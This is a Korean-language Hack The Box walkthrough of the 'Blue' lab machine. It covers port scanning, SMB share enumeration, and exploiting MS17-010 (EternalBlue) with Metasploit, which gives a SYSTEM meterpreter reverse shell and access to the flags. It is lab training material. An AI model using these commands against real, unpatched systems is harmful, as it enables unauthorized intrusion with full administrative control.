# HTB - Blue

## 머신 정보

|항목|내용|
|---|---|
|이름|Blue|
|난이도|Easy|
|OS|Windows 7|
|취약점|MS17-010 (EternalBlue)|
|태그|`SMB` `EternalBlue` `WannaCry` `CVE-2017-0144`|

---

## 정찰 (Reconnaissance)

### Nmap 포트 스캔

```bash
nmap -p- --min-rate 10000 -T4 <TARGET_IP>
```

**결과:**

|PORT|STATE|SERVICE|
|---|---|---|
|135/tcp|open|msrpc|
|139/tcp|open|netbios-ssn|
|445/tcp|open|microsoft-ds|
|49152-49157/tcp|open|unknown|

> 135, 139, 445 포트 조합 → 전형적인 Windows SMB 머신

### OS 및 호스트명 확인

```bash
crackmapexec smb <TARGET_IP>
```

- **Hostname:** HARIS-PC
- **OS:** Windows 7 (build 7601) x64

### SMB 쉐어 열거

```bash
smbclient -L //<TARGET_IP> -N
```

**발견된 쉐어 (5개):**

- `ADMIN$`
- `C$`
- `IPC$`
- `Share`
- `Users`

---

## 취약점 분석

### MS17-010 (EternalBlue)

|항목|내용|
|---|---|
|Security Bulletin|**MS17-010**|
|CVE|CVE-2017-0144|
|취약점 유형|SMBv1 원격 코드 실행 (RCE)|
|영향 OS|Windows 7, Server 2008 R2 등|
|관련 악성코드|**WannaCry** 랜섬웨어 (2017년 5월)|
|원출처|NSA 개발 → Shadow Brokers 유출|

```bash
# Metasploit으로 취약점 확인
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run
```

---

## 익스플로잇 (Exploitation)

### EternalBlue - Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set LHOST tun0
run
```

**결과:**

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> EternalBlue는 커널 레벨 취약점이므로 Privilege Escalation 없이 바로 SYSTEM 권한 획득

---

## 플래그 획득

### User Flag (haris 데스크탑)

```bash
meterpreter > shell
C:\Windows\system32> cd C:\Users\haris\Desktop
C:\Users\haris\Desktop> type user.txt
```

### Root Flag (Administrator 데스크탑)

```bash
C:\Users\haris\Desktop> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> type root.txt
```

---

## 정리 및 교훈

- SMB 포트(445)가 열려있고 Windows 7이면 **MS17-010 먼저 의심**
- EternalBlue는 패치가 나온 지 8년이 넘었지만 여전히 실전에서 통함
- SYSTEM 권한 = Windows의 root, 모든 파일 접근 가능
- **교훈:** 레거시 OS + 패치 미적용 = 치명적

---

## 참고

- [MS17-010 공식 보안 공지](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- Metasploit 모듈: `exploit/windows/smb/ms17_010_eternalblue`